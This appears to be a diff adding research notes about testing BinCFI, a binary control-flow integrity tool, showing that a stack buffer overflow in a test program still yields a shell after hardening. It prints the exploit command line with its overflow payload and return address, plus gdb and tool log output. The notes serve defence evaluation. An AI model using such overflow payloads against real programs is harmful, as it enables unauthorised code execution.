@@ -1,0 +1,86 @@
+- We tried to experiment with BinCFI.
+But failed because an exploit works :(
+
+How to reproduce
+- compile vuln in test directory
+- copy it to given virtualbox (http://www.seclab.cs.sunysb.edu/seclab/psi/psi-vbox-v1.0.tar.gz)
+- /home/mingwei/cfi/modify_elf.py ./vuln
+- ./target_elf/vuln/vuln_final `python -c'print"A"*268 + "\xca\x84\x04\x08"'`
+GIVE ME INPUT
+$ echo 'PWNED!!'
+PWNED!!
+
+- Static compiled binary with CFI is crashed!
+
+(gdb) r
+Starting program: /home/mingwei/cfi/python_rw/target_elf/vuln/vuln_final 
+
+Program received signal SIGSEGV, Segmentation fault.
+0x03000000 in ?? ()
+(gdb) x/i $pc
+=> 0x3000000: Cannot access memory at address 0x3000000
+
+- I installed BinCFI in VM.
+In given cfi-1.1.tar.gz, it has no modify_ldt directory.
+Even though the folder doesn't exist, modifying elf seems work.
+However, the result was same. The exploit works.
+
+- If I tried to jump to 0x80484d1, then it gives me an error message.
+Therefore, the exploitability is not caused by our misconfiguration.
+But it is the problem of BinCFI. It does not give any Control Flow "Integrity"
+
+mingwei@ubuntu:~/cfi/python_rw$ ./target_elf/vuln/vuln_final \
+                                  `python -c'print"A"*268+"\xd1\x84\x04\x08"'`
+GIVE ME INPUT
+      2897: invalid target address: 80484d1 vuln
+mingwei@ubuntu:~/cfi/python_rw$ ./target_elf/vuln/vuln_final \
+                                  `python -c'print"A"*268+"\xca\x84\x04\x08"'`
+GIVE ME INPUT
+$ echo 'PWNED!' 
+PWNED!
+
+- BinCFI TEST Result
+
+INFO:root:252- 804831c:	e8 cf ff ff ff       	call   80482f0 <__libc_start_main@plt>
+253: 8048321:	f4                   	hlt    
+254- 8048322:	66 90                	xchg   %ax,%ax
+
+INFO:root:284- 8048363:	ff d0                	call   *%eax
+285: 8048365:	83 c4 10             	add    $0x10,%esp
+286- 8048368:	c9                   	leave  
+
+INFO:root:308- 804839d:	ff d2                	call   *%edx
+309: 804839f:	83 c4 10             	add    $0x10,%esp
+310- 80483a2:	c9                   	leave  
+
+INFO:root:321- 80483bf:	e8 7c ff ff ff       	call   8048340 <deregister_tm_clones>
+322: 80483c4:	c6 05 18 97 04 08 01 	movb   $0x1,0x8049718
+323- 80483cb:	c9                   	leave  
+
+INFO:root:341- 80483f0:	ff d2                	call   *%edx
+342: 80483f2:	83 c4 10             	add    $0x10,%esp
+343- 80483f5:	c9                   	leave  
+
+INFO:root:359- 804841d:	e8 ae fe ff ff       	call   80482d0 <strcpy@plt>
+360: 8048422:	83 c4 10             	add    $0x10,%esp
+361- 8048425:	c9                   	leave  
+
+INFO:root:376- 8048442:	e8 b4 ff ff ff       	call   80483fb <func>
+377: 8048447:	83 c4 10             	add    $0x10,%esp
+378- 804844a:	8b 4d fc             	mov    -0x4(%ebp),%ecx
+
+INFO:root:396- 8048466:	e8 c5 fe ff ff       	call   8048330 <__x86.get_pc_thunk.bx>
+397: 804846b:	81 c3 8d 12 00 00    	add    $0x128d,%ebx
+398- 8048471:	83 ec 1c             	sub    $0x1c,%esp
+
+INFO:root:401- 804847e:	e8 11 fe ff ff       	call   8048294 <_init>
+402: 8048483:	8d 83 08 ff ff ff    	lea    -0xf8(%ebx),%eax
+403- 8048489:	29 c6                	sub    %eax,%esi
+
+INFO:root:413- 80484ab:	ff 94 bb 08 ff ff ff 	call   *-0xf8(%ebx,%edi,4)
+414: 80484b2:	83 c7 01             	add    $0x1,%edi
+415- 80484b5:	39 f7                	cmp    %esi,%edi
+
+INFO:root:446- 80484d8:	e8 53 fe ff ff       	call   8048330 <__x86.get_pc_thunk.bx>
+447: 80484dd:	81 c3 1b 12 00 00    	add    $0x121b,%ebx
+448- 80484e3:	83 c4 08             	add    $0x8,%esp
